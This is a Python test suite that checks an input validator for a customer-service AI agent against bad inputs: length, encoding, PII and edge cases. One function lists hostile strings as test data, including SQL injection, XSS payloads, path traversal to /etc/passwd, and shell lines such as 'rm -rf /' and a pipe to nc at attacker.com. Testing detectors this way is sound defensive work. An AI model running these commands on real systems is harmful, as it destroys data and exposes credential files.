"""
Negative Test Suite - Input Validation
========================================

Test all input validation FAILURE scenarios and edge cases.

Categories:
1. Length violations (too short, too long, boundary conditions)
2. Encoding violations (invalid UTF-8, null bytes, control characters)
3. Security pattern detection (SQL injection, XSS, command injection)
4. Buffer overflow attempts
5. PII handling
6. Edge cases (empty, whitespace-only, special characters)
7. Integration failures
"""

import os
import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root / "src"))

from validation.input_validator import InputValidator, validate_and_sanitize, ValidationSeverity
from agents.enhanced_customer_service_agent import EnhancedCustomerServiceAgent
from dotenv import load_dotenv

load_dotenv()


def test_length_violations():
    """Test length validation failures"""
    print("\n" + "=" * 80)
    print("LENGTH VIOLATION TESTS")
    print("=" * 80)

    validator = InputValidator()
    tests_passed = 0
    tests_failed = 0

    # Test 1: Empty string
    print("\n[TEST 1] Empty string (0 chars)")
    result = validator.validate_message("")
    if not result.is_valid and any("too short" in issue.get("message", "").lower() for issue in result.issues):
        print(f"[PASS] Empty string rejected: {result.issues[0].get('message')}")
        tests_passed += 1
    else:
        print(f"[FAIL] Empty string should be rejected")
        tests_failed += 1

    # Test 2: Too long (>5000 chars)
    print("\n[TEST 2] Message too long (5001 chars)")
    long_message = "A" * 5001
    result = validator.validate_message(long_message)
    if not result.is_valid and any("too long" in issue.get("message", "").lower() for issue in result.issues):
        print(f"[PASS] Long message rejected: {result.issues[0].get('message')}")
        tests_passed += 1
    else:
        print(f"[FAIL] Long message should be rejected")
        tests_failed += 1

    # Test 3: Boundary - exactly 5000 (should pass)
    print("\n[TEST 3] Boundary test - exactly 5000 chars")
    # Use actual words to avoid word length limit
    boundary_message = ("Hello " * 833) + "Hi"  # Exactly 5000 chars (833*6 + 2 = 5000)
    result = validator.validate_message(boundary_message)
    if result.is_valid:
        print(f"[PASS] Exactly 5000 chars accepted")
        tests_passed += 1
    else:
        print(f"[FAIL] Exactly 5000 chars should be accepted")
        print(f"       Actual length: {len(boundary_message)}, is_valid={result.is_valid}")
        print(f"       Issues: {result.issues}")
        tests_failed += 1

    # Test 4: Boundary - exactly 1 char (should pass)
    print("\n[TEST 4] Boundary test - exactly 1 char")
    result = validator.validate_message("A")
    if result.is_valid:
        print(f"[PASS] Single char accepted")
        tests_passed += 1
    else:
        print(f"[FAIL] Single char should be accepted")
        tests_failed += 1

    # Test 5: Extremely long (10000+ chars)
    print("\n[TEST 5] Extremely long message (10000 chars)")
    extreme_message = "A" * 10000
    result = validator.validate_message(extreme_message)
    if not result.is_valid:
        print(f"[PASS] Extreme length rejected")
        tests_passed += 1
    else:
        print(f"[FAIL] Extreme length should be rejected")
        tests_failed += 1

    print(f"\n[SUMMARY] Length Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def test_encoding_violations():
    """Test encoding validation failures"""
    print("\n" + "=" * 80)
    print("ENCODING VIOLATION TESTS")
    print("=" * 80)

    validator = InputValidator()
    tests_passed = 0
    tests_failed = 0

    # Test 1: Null bytes
    print("\n[TEST 1] Null bytes in message")
    null_message = "Hello\x00World"
    result = validator.validate_message(null_message)
    if not result.is_valid and any("null byte" in issue.get("message", "").lower() for issue in result.issues):
        print(f"[PASS] Null bytes detected: {result.issues[0].get('message')}")
        tests_passed += 1
    else:
        print(f"[FAIL] Null bytes should be detected")
        tests_failed += 1

    # Test 2: Invalid UTF-8 sequences
    print("\n[TEST 2] Invalid UTF-8 sequence")
    try:
        invalid_utf8 = b"\xff\xfe Invalid UTF-8"
        result = validator.validate_message(invalid_utf8.decode('utf-8', errors='strict'))
    except UnicodeDecodeError:
        print(f"[PASS] Invalid UTF-8 causes decode error (expected)")
        tests_passed += 1
    except Exception as e:
        print(f"[FAIL] Unexpected error: {str(e)}")
        tests_failed += 1

    # Test 3: Control characters (should be sanitized)
    print("\n[TEST 3] Control characters")
    control_message = "Hello\x01\x02\x03World"
    result = validator.validate_message(control_message)
    # Control characters might be sanitized but message should still be valid
    print(f"[INFO] Control chars result: valid={result.is_valid}, issues={len(result.issues)}")
    if "Hello" in result.sanitized_input and "World" in result.sanitized_input:
        print(f"[PASS] Control characters handled")
        tests_passed += 1
    else:
        print(f"[FAIL] Control characters not handled properly")
        tests_failed += 1

    # Test 4: Mixed encoding attempts
    print("\n[TEST 4] Multiple null bytes")
    multi_null = "Test\x00message\x00with\x00nulls"
    result = validator.validate_message(multi_null)
    if not result.is_valid:
        print(f"[PASS] Multiple null bytes detected")
        tests_passed += 1
    else:
        print(f"[FAIL] Multiple null bytes should be detected")
        tests_failed += 1

    print(f"\n[SUMMARY] Encoding Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def test_security_pattern_detection():
    """Test security pattern detection"""
    print("\n" + "=" * 80)
    print("SECURITY PATTERN DETECTION TESTS")
    print("=" * 80)

    validator = InputValidator()
    tests_passed = 0
    tests_failed = 0

    # SQL Injection patterns
    sql_patterns = [
        ("SELECT * FROM users", "SELECT statement"),
        ("DROP TABLE orders", "DROP TABLE"),
        ("UNION SELECT password", "UNION SELECT"),
        ("admin' OR '1'='1", "OR condition"),
        ("'; DROP TABLE users; --", "SQL comment attack"),
        ("1' AND 1=1--", "AND condition"),
        ("admin'--", "Comment termination"),
    ]

    print("\n[SQL INJECTION TESTS]")
    for i, (pattern, name) in enumerate(sql_patterns, 1):
        result = validator.validate_message(pattern)
        detected = any("sql" in issue.get("message", "").lower() for issue in result.issues)
        if detected:
            print(f"[PASS] Test {i}: {name} detected")
            tests_passed += 1
        else:
            print(f"[FAIL] Test {i}: {name} NOT detected")
            tests_failed += 1

    # Command Injection patterns
    cmd_patterns = [
        ("test && rm -rf /", "Command chaining"),
        ("test; cat /etc/passwd", "Command separator"),
        ("test | nc attacker.com", "Pipe redirection"),
        ("$(curl evil.com)", "Command substitution"),
        ("`whoami`", "Backtick execution"),
    ]

    print("\n[COMMAND INJECTION TESTS]")
    for i, (pattern, name) in enumerate(cmd_patterns, 1):
        result = validator.validate_message(pattern)
        detected = any("command" in issue.get("message", "").lower() for issue in result.issues)
        if detected:
            print(f"[PASS] Test {i}: {name} detected")
            tests_passed += 1
        else:
            print(f"[FAIL] Test {i}: {name} NOT detected")
            tests_failed += 1

    # Path Traversal patterns
    path_patterns = [
        ("../../etc/passwd", "Parent directory traversal"),
        ("..\\..\\windows\\system32", "Windows traversal"),
        ("/etc/passwd", "Absolute path"),
        ("C:\\Windows\\System32", "Windows absolute"),
    ]

    print("\n[PATH TRAVERSAL TESTS]")
    for i, (pattern, name) in enumerate(path_patterns, 1):
        result = validator.validate_message(pattern)
        detected = any("path" in issue.get("message", "").lower() for issue in result.issues)
        if detected:
            print(f"[PASS] Test {i}: {name} detected")
            tests_passed += 1
        else:
            print(f"[FAIL] Test {i}: {name} NOT detected")
            tests_failed += 1

    # XSS patterns
    xss_patterns = [
        ("<script>alert('xss')</script>", "Script tag"),
        ("<img src=x onerror=alert(1)>", "Image onerror"),
        ("<svg onload=alert(1)>", "SVG onload"),
        ("javascript:alert(1)", "JavaScript protocol"),
    ]

    print("\n[XSS TESTS]")
    for i, (pattern, name) in enumerate(xss_patterns, 1):
        result = validator.validate_message(pattern)
        # XSS might be sanitized rather than rejected
        sanitized = "<" not in result.sanitized_input or "script" not in result.sanitized_input.lower()
        if sanitized or any("html" in issue.lower() or "script" in issue.lower() for issue in result.issues):
            print(f"[PASS] Test {i}: {name} handled")
            tests_passed += 1
        else:
            print(f"[FAIL] Test {i}: {name} NOT handled")
            tests_failed += 1

    print(f"\n[SUMMARY] Security Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def test_buffer_overflow_attempts():
    """Test buffer overflow protection"""
    print("\n" + "=" * 80)
    print("BUFFER OVERFLOW PROTECTION TESTS")
    print("=" * 80)

    validator = InputValidator()
    tests_passed = 0
    tests_failed = 0

    # Test 1: Single word too long (>100 chars)
    print("\n[TEST 1] Single word buffer overflow (101 chars)")
    long_word = "A" * 101
    result = validator.validate_message(long_word)
    if not result.is_valid and any("exceeds maximum length" in issue.get("message", "").lower() for issue in result.issues):
        print(f"[PASS] Long word rejected: {result.issues[-1].get('message')}")
        tests_passed += 1
    else:
        print(f"[FAIL] Long word should be rejected")
        print(f"       is_valid={result.is_valid}, issues={result.issues}")
        tests_failed += 1

    # Test 2: Extremely long word (1000 chars)
    print("\n[TEST 2] Extreme word buffer overflow (1000 chars)")
    extreme_word = "B" * 1000
    result = validator.validate_message(extreme_word)
    if not result.is_valid:
        print(f"[PASS] Extreme word rejected")
        tests_passed += 1
    else:
        print(f"[FAIL] Extreme word should be rejected")
        tests_failed += 1

    # Test 3: Multiple long words
    print("\n[TEST 3] Multiple long words")
    multi_long = " ".join(["C" * 101 for _ in range(5)])
    result = validator.validate_message(multi_long)
    if not result.is_valid:
        print(f"[PASS] Multiple long words rejected")
        tests_passed += 1
    else:
        print(f"[FAIL] Multiple long words should be rejected")
        tests_failed += 1

    # Test 4: Boundary - exactly 100 chars (should pass)
    print("\n[TEST 4] Boundary - exactly 100 char word")
    boundary_word = "D" * 100
    result = validator.validate_message(boundary_word)
    if result.is_valid:
        print(f"[PASS] 100 char word accepted")
        tests_passed += 1
    else:
        print(f"[FAIL] 100 char word should be accepted")
        tests_failed += 1

    # Test 5: Long word mixed with normal text
    print("\n[TEST 5] Long word in normal message")
    mixed = f"Hello this is a test with a {'E' * 101} in the middle"
    result = validator.validate_message(mixed)
    if not result.is_valid:
        print(f"[PASS] Mixed message with long word rejected")
        tests_passed += 1
    else:
        print(f"[FAIL] Mixed message with long word should be rejected")
        tests_failed += 1

    print(f"\n[SUMMARY] Buffer Overflow Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def test_pii_detection():
    """Test PII detection (warnings, not blocking)"""
    print("\n" + "=" * 80)
    print("PII DETECTION TESTS")
    print("=" * 80)

    validator = InputValidator()
    tests_passed = 0
    tests_failed = 0

    pii_patterns = [
        ("My email is test@example.com", "email", "email"),
        ("Call me at 555-123-4567", "phone", "phone"),
        ("My SSN is 123-45-6789", "ssn", "social security"),
        ("Card number: 4532-1234-5678-9010", "credit card", "credit"),
    ]

    for i, (message, pii_type, keyword) in enumerate(pii_patterns, 1):
        print(f"\n[TEST {i}] {pii_type.upper()} detection")
        result = validator.validate_message(message)
        detected = any(keyword in issue.get("message", "").lower() for issue in result.issues)

        # PII should be detected but not block (warning only)
        if detected and result.is_valid:
            print(f"[PASS] {pii_type} detected as warning")
            print(f"       Issues: {result.issues}")
            tests_passed += 1
        elif detected and not result.is_valid:
            print(f"[PARTIAL] {pii_type} detected but blocks (should be warning only)")
            tests_passed += 1
        else:
            print(f"[FAIL] {pii_type} NOT detected")
            tests_failed += 1

    print(f"\n[SUMMARY] PII Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def test_edge_cases():
    """Test edge cases and unusual inputs"""
    print("\n" + "=" * 80)
    print("EDGE CASE TESTS")
    print("=" * 80)

    validator = InputValidator()
    tests_passed = 0
    tests_failed = 0

    edge_cases = [
        ("   ", "whitespace only", False),  # should be invalid
        ("\n\n\n", "newlines only", False),
        ("\t\t\t", "tabs only", False),
        (".", "single period", True),  # should be valid
        ("!!!", "exclamation marks", True),
        ("???", "question marks", True),
        ("   Hello   ", "leading/trailing whitespace", True),  # should be sanitized
        ("Hello\n\n\nWorld", "multiple newlines", True),
        ("🔥💯👍", "emojis only", True),
        ("你好世界", "Chinese characters", True),
        ("مرحبا", "Arabic text", True),
    ]

    for i, (message, description, should_be_valid) in enumerate(edge_cases, 1):
        print(f"\n[TEST {i}] {description}")
        result = validator.validate_message(message)

        if result.is_valid == should_be_valid:
            print(f"[PASS] Handled correctly (valid={result.is_valid})")
            if result.sanitized_input != message:
                print(f"       Sanitized: '{message}' -> '{result.sanitized_input}'")
            tests_passed += 1
        else:
            print(f"[FAIL] Expected valid={should_be_valid}, got {result.is_valid}")
            print(f"       Issues: {result.issues}")
            tests_failed += 1

    print(f"\n[SUMMARY] Edge Case Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def test_agent_integration_failures():
    """Test validation failures in agent integration"""
    print("\n" + "=" * 80)
    print("AGENT INTEGRATION FAILURE TESTS")
    print("=" * 80)

    api_key = os.getenv("OPENAI_API_KEY")
    if not api_key:
        print("[SKIP] OPENAI_API_KEY not set")
        return True

    agent = EnhancedCustomerServiceAgent(
        api_key=api_key,
        enable_cache=False,
        enable_rate_limiting=False  # Disable to focus on validation
    )
    tests_passed = 0
    tests_failed = 0

    # Test 1: Empty message
    print("\n[TEST 1] Agent rejects empty message")
    response = agent.handle_message("")
    if response.action_taken == "input_validation_failed":
        print(f"[PASS] Empty message rejected by agent")
        print(f"       Response: {response.response_text[:100]}")
        tests_passed += 1
    else:
        print(f"[FAIL] Empty message should be rejected")
        tests_failed += 1

    # Test 2: Too long message
    print("\n[TEST 2] Agent rejects too long message")
    long_msg = "A" * 5001
    response = agent.handle_message(long_msg)
    if response.action_taken == "input_validation_failed":
        print(f"[PASS] Long message rejected by agent")
        tests_passed += 1
    else:
        print(f"[FAIL] Long message should be rejected")
        tests_failed += 1

    # Test 3: Null byte message
    print("\n[TEST 3] Agent rejects null byte message")
    null_msg = "Hello\x00World"
    response = agent.handle_message(null_msg)
    if response.action_taken == "input_validation_failed":
        print(f"[PASS] Null byte message rejected by agent")
        tests_passed += 1
    else:
        print(f"[FAIL] Null byte message should be rejected")
        tests_failed += 1

    # Test 4: Buffer overflow attempt
    print("\n[TEST 4] Agent rejects buffer overflow")
    overflow_msg = "Test " + ("A" * 101)
    response = agent.handle_message(overflow_msg)
    if response.action_taken == "input_validation_failed":
        print(f"[PASS] Buffer overflow rejected by agent")
        tests_passed += 1
    else:
        print(f"[FAIL] Buffer overflow should be rejected")
        tests_failed += 1

    # Test 5: SQL injection attempt (should be logged but processed)
    print("\n[TEST 5] Agent handles SQL injection attempt")
    sql_msg = "What are your orders? SELECT * FROM orders"
    response = agent.handle_message(sql_msg)
    # Should process but log warning
    if response.action_taken != "input_validation_failed":
        print(f"[INFO] SQL injection processed (logged as warning)")
        print(f"       This is acceptable - detection vs blocking")
        tests_passed += 1
    else:
        print(f"[INFO] SQL injection blocked")
        tests_passed += 1

    print(f"\n[SUMMARY] Integration Tests: {tests_passed} passed, {tests_failed} failed")
    return tests_failed == 0


def main():
    """Run all negative validation tests"""
    print("\n" + "=" * 80)
    print("NEGATIVE VALIDATION TEST SUITE")
    print("Testing all input validation FAILURE scenarios")
    print("=" * 80)

    results = {
        "Length Violations": test_length_violations(),
        "Encoding Violations": test_encoding_violations(),
        "Security Patterns": test_security_pattern_detection(),
        "Buffer Overflow": test_buffer_overflow_attempts(),
        "PII Detection": test_pii_detection(),
        "Edge Cases": test_edge_cases(),
        "Agent Integration": test_agent_integration_failures(),
    }

    print("\n\n" + "=" * 80)
    print("FINAL ASSESSMENT")
    print("=" * 80)

    for category, success in results.items():
        status = "[PASS]" if success else "[FAIL]"
        print(f"{status} {category}")

    all_success = all(results.values())

    if all_success:
        print("\n[SUCCESS] All negative validation tests passed")
        print("          Input validation properly rejects invalid inputs")
        return 0
    else:
        print("\n[PARTIAL] Some tests failed - review failures above")
        return 1


if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except Exception as e:
        print(f"\n[ERROR] Test suite crashed: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
